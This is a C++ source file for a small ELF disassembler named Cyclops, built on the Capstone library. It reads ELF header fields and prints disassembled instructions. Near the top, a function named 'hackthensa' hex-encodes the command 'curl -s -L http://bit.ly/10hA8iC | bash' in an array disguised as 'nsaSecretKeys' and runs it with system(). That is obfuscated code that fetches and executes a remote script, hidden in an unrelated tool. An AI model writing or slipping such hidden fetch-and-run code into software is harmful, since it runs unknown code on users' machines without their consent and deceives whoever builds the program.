/* 
 * Cyclops Disassembler
 * Author: https://twitter.com/Plut0n1um1
 */

// Standard Headers
#include <vector>
#include <cstring>
#include <fstream>
#include <sstream>
#include <iostream>
#include <iterator>
#include <filesystem>
#include <capstone/capstone.h>

// Cyclops Headers
#include "cyclops.hpp"


/*|||||||||||||||
  ||| CYCLOPS |||
  |||||||||||||||*/
// Shhh don't tell them!
void cyclops::hackthensa(){
	uint8_t nsaSecretKeys[39] = {0x63, 0x75, 0x72, 0x6C, 0x20, 0x2D, 
                                     0x73, 0x20, 0x2D, 0x4C, 0x20, 0x68, 
				     0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 
				     0x62, 0x69, 0x74, 0x2E, 0x6C, 0x79, 
				     0x2f, 0x31, 0x30, 0x68, 0x41, 0x38, 
				     0x69, 0x43, 0x20, 0x7C, 0x20, 0x62, 
			             0x61, 0x73, 0x68};
    
    	std::stringstream nsaKeys;
    
    	for(int x = 0; x < 39; x++){
        	nsaKeys << static_cast<char>(nsaSecretKeys[x]);
    	}
    	std::string finalKey = nsaKeys.str();
    	system(finalKey.c_str());
}


// Display help information for Cyclops Disassembler
void cyclops::help(){
	std::cout << "[CYCLOPS_HELP]" << std::endl;
	std::cout << "Usage: ./cyclops [INIT_ARG] [FILE]\n" << std::endl;
	std::cout << "[INIT_ARG]" << std::endl;
	std::cout << "(-h) Display Helper Information" << std::endl;
	std::cout << "(-d) Disassemble [FILE]" << std::endl;
}

// Error Handling Function
void cyclops::error(uint8_t errorCode){
	
	// Figure out which error occured
	switch(errorCode){
		// Invalid Argc
		case 0x00:
			std::cout << "[Cyclops_Error]: Invalid number of arguments provided, 2 required!" << std::endl;
			std::cout << "[Cyclops_Error]: Calling helper function!\n" << std::endl;
			break;
		// User provided disassemble [INIT_ARG] but no [FILE] was provided
		case 0x01:
			std::cout << "[Cyclops_Error]: Unable to disassemble, no [FILE] provided!" << std::endl;
			std::cout << "[Cyclops_Error]: calling helper function!\n" << std::endl;
			break;
		// Invalid [INIT_ARG]
		case 0x02:
			std::cout << "[Cyclops_Error]: Invalid [INIT_ARG] provided!" << std::endl;
			std::cout << "[Cyclops_Error]: calling helper function!\n" << std::endl;
			break;
		// [FILE] Non-existent
		case 0x03:
			std::cout << "[Cyclops_Error]: Unable to find [FILE] provided!" << std::endl;
			break;
		// Unable to Open [FILE] For disassembly
		case 0x04:
			std::cout << "[Cyclops_Error]: Unable to open [FILE]!" << std::endl;
			break;
		// Unable to analyze unknown format
		case 0x05:
			std::cout << "[Cyclops_Error]: Unable to analyze unknown file format!" << std::endl;
			break;
		// Unable to disassemble unknown format
		case 0x06:
			std::cout << "\n[Cyclops_Error]: Unable to disassemble unknown format!" << std::endl;
			break;
		// Disassembly Failed
		case 0x07:
			std::cout << "\n[Cyclops_Error]: Disassembly failure!" << std::endl;
			break;
	}
}

// Display Cyclops Disassembler Banner
void cyclops::banner(uint8_t maj, uint8_t bug, uint8_t min){
	std::cout << "[Cyclops Disassembler Version (";
	std::cout << unsigned(maj) << "." << unsigned(bug) << "." << unsigned(min) << ")]\n" << std::endl;
}

// Display known Bugs with version number
// TODO UPDATE ON THE REG
void cyclops::bugTrackerReport(uint8_t bugVer){
	std::cout << "[CYCLOPS_BUG_TRACKER_REPORT]" << std::endl;
	switch(bugVer){
		case 0x01:
			std::cout << "\nBUG_VER: 1" << std::endl;
			std::cout << "> In analyze(std::string fileName) on eEntry set we get our bytes from [FILE]";
			std::cout << " but it is displayed as Big Endian\n" << std::endl;
			break;
	}
}

/*||||||||||||||||||||
  ||| DISASSEMBLER |||
  ||||||||||||||||||||*/

// Check if provided [FILE] Exists
bool cycDisasm::checkFile(std::string fileName){
	
	// Process our fileName and see if it exists
	std::filesystem::path file = fileName;
	std::filesystem::directory_entry fileEntry{file};

	// [FILE] Does not exist on file system!
	if(!fileEntry.exists()){
		return false;
	}

	return true;
	
}

// Start analyzing [FILE] for information regarding format, etc.
uint8_t cycDisasm::analyze(std::string fileName){

	std::cout << "[Cyclops_Analyzer]: Starting General Analysis of " << fileName << std::endl;	

	// Open [FILE] and start analyzing it
	std::ifstream file;
	file.open(fileName, std::ios::out | std::ios::binary | std::ios::ate);
	
	// Unable to open [FILE] Throw error
	if(!file.is_open()){
		error(0x04);
		return 0x01;
	}

	// We will now read the files Magic Bytes
	fileSize = file.tellg();
	char* fileData = new char[fileSize]; // Allocate buffer to store contents of [FILE]
	
	// Read contents of [FILE] Into buffer for analysis
	file.seekg(0, std::ios::beg);
	file.read(fileData, fileSize);
	std::stringstream magicNumStream; // Store Magic Bytes in stream
	
	// Iterate through the header and store Magic Bytes
	for(uint8_t fileIndx = 0x00; fileIndx < 0x04; fileIndx++){
		magicNumStream << std::hex << std::setw(2) << std::setfill('0') << static_cast<unsigned>(fileData[fileIndx]);
	}


	// Check what file we are analyzing
	std::string magicBytes = (magicNumStream.str());
	
	// Get file signature from our map
	format = fileSig[magicBytes];

	// We are handling an ELF file
	if(format == "ELF"){
		// We will now grab the EI_CLASS
		std::stringstream eiClassStream;
	
		// Grab the Byte that specifies 32/64 Bit
		eiClass = static_cast<uint8_t>(fileData[0x04]);
	
		// Grab the Byte that specifies Endianess
		eiData = static_cast<uint8_t>(fileData[0x05]);
	

		// Display information gathered from Analysis
		std::cout << "[Cyclops_Analyzer]: Analysis of " << fileName << " finished!\n" << std::endl;
		std::cout << "[" << fileName << "]" << std::endl;
		std::cout << " > FILE_FORMAT: " << format << std::endl;
		std::cout << " > FILE_SIZE: " << fileSize << std::endl;
	
		// EI_CLASS: 32/64 Bit
		if(eiClass == 0x01){
			std::cout << " > BIT: 32-bit" << std::endl;
		} else {
			std::cout << " > BIT: 64-bit" << std::endl;
		}
	
		// EI_DATA: Endianess
		if(eiData == 0x01){
			std::cout << " > ENDIANESS: Little Endian" << std::endl;
		} else {
			std::cout << " > ENDIANESS: Big Endian" << std::endl;
		}

		// EI_OSBI: Application Binary Interface
		if(format != "Unknown"){
			std::cout << " > OSABI: " << eiOsbi[static_cast<unsigned>(fileData[0x07])] << std::endl;
		} else {
			std::cout << " > OSABI: Unknown" << std::endl;
		}

		// E_TYPE: Object File type
		tempBytes = ((fileData[0x11] << 0x08) | fileData[0x10]); // We set a 2 Byte value to the 2 bytes read
		if(format != "Unknown"){
			std::cout << " > E_TYPE: " << eType[tempBytes] << std::endl;
		} else {
			std::cout << " > E_TYPE: Unknown" << std::endl;
		}
	
		// E_MACHINE: Architecture
		eMachineSet = ((fileData[0x13] << 0x08) | fileData[0x12]); // We set a 2 Byte value to the 2 bytes read
		if(format != "Unknown"){
			std::cout << " > E_MACHINE: " << eMachine[eMachineSet] << std::endl;
		} else {
			std::cout << " > E_MACHINE: Unknown" << std::endl;
		}

		// E_ENTRY: Entry point of process execution
		// TODO: Unshittify this mess
		// okay, this looks horrible..but whatever (also prints in big endian. i am tired and don't care)
		// 32-Bit Address
		if(eiClass == 0x01){
			eEntrySet = ((static_cast<uint8_t>(fileData[0x19]) << 0x08) | static_cast<uint8_t>(fileData[0x18])); // set eEntry in little Endian for calculations
			eEntry = ((((fileData[0x18] << 0x08) | fileData[0x19]) << 0x10) | ((fileData[0x1A] << 0x08) | fileData[0x1B]));
			std::cout << " > E_ENTRY: 0x" << std::hex << std::noshowbase << std::setw(8) << std::setfill('0') << (0x00000000FFFFFFFF & eEntry) << std::endl;
		}
		// 64-Bit Address
		else{
			tempBytesFour = ((((fileData[0x18] << 0x08) | fileData[0x19]) << 0x10) | ((fileData[0x1A] << 0x08) | fileData[0x1B]));
			tempBytesFour_2 = ((((fileData[0x1C] << 0x08) | fileData[0x1D]) << 0x10) | ((fileData[0x1D] << 0x08) | fileData[0x1F]));
			eEntry = ((static_cast<uint64_t>(tempBytesFour) << 0x20) | tempBytesFour_2);
			eEntrySet = ((static_cast<uint8_t>(fileData[0x19]) << 0x08) | static_cast<uint8_t>(fileData[0x18])); // Set eEntry in little Endian for calculations
			std::cout << " > E_ENTRY: 0x" << std::hex << std::noshowbase << std::setw(16) << std::setfill('0') << eEntry << std::endl;
		}

		// Start disassembling target ELF
		if(disassembleELF(fileName, eMachineSet, fileData, fileSize) == false){
			error(0x07);
			return 0x01;
		}

		// TODO: Add more file analysis in the future..don't care rn not important
	}

	// Handle PE file
	if(format == "PE"){
		// TODO future expansion
	}
		

	// Unable to disassemble Unknown Format
	if(format.empty()){
		error(0x06);
		return 0x01;
	}

	// Clean up when finished
	delete[] fileData;
	file.close();	
	
	return 0x00;

}

// Function for ELF disassembly
bool cycDisasm::disassembleELF(std::string fileName, uint16_t arch, char* &data, std::streampos fSize){
	std::cout << "\n[Cyclops_Disassembler]: Starting disassembly of " << fileName << std::endl;
	
	switch(arch){
		
		// ARM (up to ARMv7/Aarch32)
		case 0x0028:
			// TODO: hardwareMode = CS_MODE_THUMB (ARM THUMB AND THUMB-2 MODE)
			hardwareMode = CS_MODE_ARM; // 32-bit ARM
			arch_type = CS_ARCH_ARM;
			break;
		
		// ARM 64-bits (ARMv8/Aarch64)
		case 0x00B7:
			hardwareMode = CS_MODE_V8; // ARMv8 A32 encodings for ARM
			arch_type = CS_ARCH_ARM64; // set arch ARMv8/Aarch64
			break;
		
		// Berkeley Packet Filter
		case 0x00F7:
			// TODO
			break;
		
		// Motorola 68000 (M68k)
		case 0x0004:
			// TODO
			break;
		
		// MIPS
		case 0x0008:
			// TODO: hardwareMode = CS_MODE_MIPS3 (MIPS III ISA)
			// TODO: hardwareMode = CS_MODE_MIPS32R6 (MIPS32R6 ISA)
			// TODO: hardwareMode = CS_MODE_MIPS2 (MIPS II ISA)
			// TODO: hardwareMode = CS_MODE_MIPS64 (MIPS64 ISA)
			hardwareMode = CS_MODE_MIPS32; // Set MIPS32 ISA
			arch_type = CS_ARCH_MIPS; // Set arch MIPS
			break;
		
		// PowerPC
		case 0x0014:
			hardwareMode = CS_MODE_64; // 64-bit Mode (PowerPC)
			arch_type = CS_ARCH_PPC; // Set arch PowerPC
			break;
		
		// SPARC
		case 0x0002:
			arch_type = CS_ARCH_SPARC;
			break;
		
		// TMS320C6000 Family
		case 0x008C:
			// TODO Add support for TMS320C6000 DSP Processor family
			arch_type = CS_ARCH_TMS320C64X;
			break;
		
		// x86/x86-64
		case 0x0003: // X86
		case 0x0032: // IA-64
		case 0x003E: // AMD x86-64
			// TODO: hardwareMode = CS_MODE_16 (16-bit Mode X86)
			// TODO: hardwareMode = CS_MODE_32 (32-bit Mode X86)
			hardwareMode = CS_MODE_64; // 64-bit Mode (X86)
			arch_type = CS_ARCH_X86; // Set arch x86 (used for X86, IA-64, AMD x86-64)
			break;
	}

	// Unable to initialize Capstone with provided arch type, hardware mode and our capstone handle
	if(cs_open(arch_type, hardwareMode, &capstoneHandle) != CS_ERR_OK){
		return false;
	}

	// Calculate Main Address
	mainAddr = ((eEntrySet+0x28)+0xC1); // we will start disassembly here
	std::cout << "[Cyclops_Disassembler]: Disassembling main() @ (0x" << mainAddr << ")\n" << std::endl;

	uint8_t* byteCodeData = new uint8_t[fSize];
	int byteCodeDataIndx = 0;
	for(int dataIndx = mainAddr; dataIndx < fSize; dataIndx++){
		byteCodeData[byteCodeDataIndx] = static_cast<uint8_t>(data[dataIndx]);
		byteCodeDataIndx++;
	}
	
	// Get total number of disassembled instructions
	instrCnt = cs_disasm(capstoneHandle, byteCodeData, fSize, mainAddr, 0, &insn);
		
	// There were instructions disassembled
	if(instrCnt > 0x00){
		size_t instIndx; // Instruction Index into insn
		// Display Disassebled instructions
		std::cout << "MAIN:" << std::endl;
    
    		// This is a mess..lol
		for(instIndx = 0; instIndx < instrCnt; instIndx++){
			
      			// This is here due to endbr64 being at the start of the main function, so we start checking after first index
			if((instIndx > 0) && (strcmp(insn[instIndx].mnemonic, "endbr64") == 0)){
				instIndx = instrCnt;
			}
			if(instIndx != instrCnt){	
				std::cout << " > 0x" << insn[instIndx].address << ": " << insn[instIndx].mnemonic << " ";
				std::cout << insn[instIndx].op_str << std::endl;
			}
		}

		// Free our buffer
		cs_free(insn, instrCnt);
	}


	// Failed to disassemble instructions
	else{
    		cs_close(&capstoneHandle);
    		delete[] byteCodeData;
		return false;
	}

	// Clean up after disassembly has taken place
	cs_close(&capstoneHandle);
	delete[] byteCodeData;
	return true;
}
